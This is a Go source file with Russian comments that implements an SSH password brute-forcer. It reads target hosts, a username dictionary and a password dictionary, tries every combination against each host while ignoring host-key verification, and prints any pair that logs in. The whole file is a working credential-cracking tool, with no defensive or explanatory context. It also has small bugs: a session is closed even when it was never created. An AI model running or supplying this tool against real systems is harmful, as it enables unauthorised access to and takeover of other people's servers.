package main

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
)

// hostInfo - информация о хосте
type hostInfo struct {
	host string
	port string
	user string
	pass string
}

func main() {
	if len(os.Args) != 4 {
		fmt.Fprintf(os.Stderr, "Использование: %s IPList userDic passDic\n", os.Args[0])
		os.Exit(1)
	} else {
		iplist := os.Args[1]
		userDict := os.Args[2]
		passDict := os.Args[3]
		scan(prepare(iplist, userDict, passDict))
		os.Exit(0)
	}
}

// prepare - подготовка к сканированию
func prepare(iplist, userDict, passDict string) (sliceIPList, sliceUser, slicePass []string) {
	iplistFile, _ := os.Open(iplist)
	defer iplistFile.Close()

	scanner := bufio.NewScanner(iplistFile)
	scanner.Split(bufio.ScanLines)

	for scanner.Scan() {
		sliceIPList = append(sliceIPList, scanner.Text())
	}

	userDictFile, _ := os.Open(userDict)
	defer userDictFile.Close()

	scannerU := bufio.NewScanner(userDictFile)
	scannerU.Split(bufio.ScanLines)

	for scannerU.Scan() {
		sliceUser = append(sliceUser, scannerU.Text())
	}

	passDictFile, _ := os.Open(passDict)
	defer passDictFile.Close()

	scannerP := bufio.NewScanner(passDictFile)
	scannerP.Split(bufio.ScanLines)

	for scannerP.Scan() {
		slicePass = append(slicePass, scannerP.Text())
	}

	return sliceIPList, sliceUser, slicePass
}

// scan - сканирование
func scan(sliceIPList, sliceUser, slicePass []string) {
	for _, hostPort := range sliceIPList {
		fmt.Printf("Try to crack %s\n", hostPort)
		t := strings.Split(hostPort, ":")
		host := t[0]
		port := t[1]

		for _, user := range sliceUser {
			for _, passwd := range slicePass {
				hostInfo := hostInfo{}
				hostInfo.host = host
				hostInfo.port = port
				hostInfo.user = user
				hostInfo.pass = passwd

				if crack(hostInfo) {
					fmt.Printf("User: %s, Password: %s\n", hostInfo.user, hostInfo.pass)
				}
			}
		}
	}
}

// crack - подбор пароля
func crack(hostInfo hostInfo) bool {
	host := hostInfo.host
	port := hostInfo.port
	user := hostInfo.user
	passwd := hostInfo.pass

	var isOk bool

	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(passwd),
		},
		Timeout:         10 * time.Second,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(), //nolint:gosec // так надо
	}

	client, err := ssh.Dial("tcp", host+":"+port, config)
	if err == nil {
		session, err := client.NewSession()
		if err == nil {
			isOk = true
		}

		err = session.Close()
		if err != nil {
			log.Println(err)
		}
	}

	return isOk
}
